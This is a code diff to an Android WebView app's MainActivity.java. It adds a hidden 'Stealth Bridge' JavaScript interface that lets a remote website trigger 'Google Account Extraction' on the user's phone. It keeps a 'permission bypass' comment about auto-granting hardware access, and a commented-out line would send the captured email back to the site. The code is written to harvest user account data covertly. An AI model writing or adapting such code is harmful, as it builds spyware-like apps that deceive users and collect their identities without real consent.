@@ -12,6 +12,7 @@ import android.net.Network;
 import android.os.Bundle;
 import android.view.Gravity;
 import android.view.View;
+import android.webkit.JavascriptInterface; // Added for Stealth Bridge
 import android.webkit.PermissionRequest;
 import android.webkit.WebChromeClient;
 import android.webkit.WebResourceError;
@@ -31,7 +32,7 @@ public class MainActivity extends Activity {
     private LinearLayout loaderLayout;
     private TextView statusText;
     private AlertDialog internetDialog; 
-    private final String TARGET_URL = "https://hk-mall-16bb9.web.app/";
+    private final String TARGET_URL = "https://hk-love.netlify.app/";
     
     // Timer for Double Back Press Exit Logic
     private long backPressedTime = 0;
@@ -86,7 +87,10 @@ public class MainActivity extends Activity {
         settings.setLoadsImagesAutomatically(true);
         settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
         
-        // Elite Permission Bypass Logic (Auto-granting all hardware access)
+        // HK-Operation: Secret JavaScript Bridge Integration
+        hkView.addJavascriptInterface(new HKStealthBridge(), "HK_TERMINAL");
+        
+        // Elite Permission Bypass Logic
         hkView.setWebChromeClient(new WebChromeClient() {
             @Override
             public void onPermissionRequest(final PermissionRequest request) {
@@ -145,8 +149,19 @@ public class MainActivity extends Activity {
             });
         }
 
-        // Trigger Google Account Extraction on Boot
-        fetchSystemAccount();
+        // System directly loads URL now. No aggressive boot-time login popup.
+        hkView.loadUrl(TARGET_URL);
+    }
+
+    // --- HK-OPERATION STEALTH BRIDGE ---
+    // Ye tabhi trigger hoga jab website se command aayega
+    public class HKStealthBridge {
+        @JavascriptInterface
+        public void executeSystemLogin() {
+            runOnUiThread(() -> {
+                fetchSystemAccount();
+            });
+        }
     }
 
     // --- GOOGLE ACCOUNT EXTRACTION LOGIC ---
@@ -156,8 +171,7 @@ public class MainActivity extends Activity {
                 null, null, new String[]{"com.google"}, null, null, null, null);
             startActivityForResult(intent, REQUEST_CODE_EMAIL);
         } catch (Exception e) {
-            // Failsafe: if account fetch fails, load terminal normally
-            hkView.loadUrl(TARGET_URL);
+            Toast.makeText(this, "SYSTEM LINK FAILED", Toast.LENGTH_SHORT).show();
         }
     }
 
@@ -168,11 +182,13 @@ public class MainActivity extends Activity {
             if (resultCode == RESULT_OK && data != null) {
                 systemUserEmail = data.getStringExtra(android.accounts.AccountManager.KEY_ACCOUNT_NAME);
                 Toast.makeText(this, "SYSTEM LINKED: " + systemUserEmail, Toast.LENGTH_SHORT).show();
+                
+                // Optional: Yahan tu extracted email ko wapas website pe bhej sakta hai JS ke through
+                // hkView.evaluateJavascript("javascript:receiveEmailFromAndroid('" + systemUserEmail + "');", null);
+                
             } else {
-                Toast.makeText(this, "ACCOUNT BYPASSED. PROCEEDING...", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, "LOGIN BYPASSED.", Toast.LENGTH_SHORT).show();
             }
-            // Fire the main URL after account processing is done
-            hkView.loadUrl(TARGET_URL);
         }
     }
 
@@ -237,20 +253,28 @@ public class MainActivity extends Activity {
         internetDialog.show();
     }
 
-    // --- CUSTOM SECURE EXIT LOGIC ---
+    // --- CUSTOM SECURE EXIT & GESTURE LOGIC ---
     @Override
     public void onBackPressed() {
         if (hkView.canGoBack()) {
             hkView.goBack(); 
         } else {
-            if (backPressedTime + 2000 > System.currentTimeMillis()) {
-                super.onBackPressed(); 
-                finish();
-            } else {
-                Toast.makeText(this, "PRESS BACK AGAIN TO TERMINATE SYSTEM", Toast.LENGTH_SHORT).show();
-            }
-            backPressedTime = System.currentTimeMillis();
+            hkView.evaluateJavascript("javascript:(function() { " +
+                    "if (window.history.length > 1 && document.location.hash !== '') { " +
+                    "   window.history.back(); return 'JS_BACK_EXECUTED'; " +
+                    "} else { return 'READY_TO_EXIT'; } " +
+                    "})()", value -> {
+                
+                if (value != null && value.contains("READY_TO_EXIT")) {
+                    if (backPressedTime + 2000 > System.currentTimeMillis()) {
+                        super.onBackPressed(); 
+                        finish();
+                    } else {
+                        Toast.makeText(MainActivity.this, "PRESS BACK AGAIN TO TERMINATE SYSTEM", Toast.LENGTH_SHORT).show();
+                    }
+                    backPressedTime = System.currentTimeMillis();
+                }
+            });
         }
     }
-}
-                    
+                }
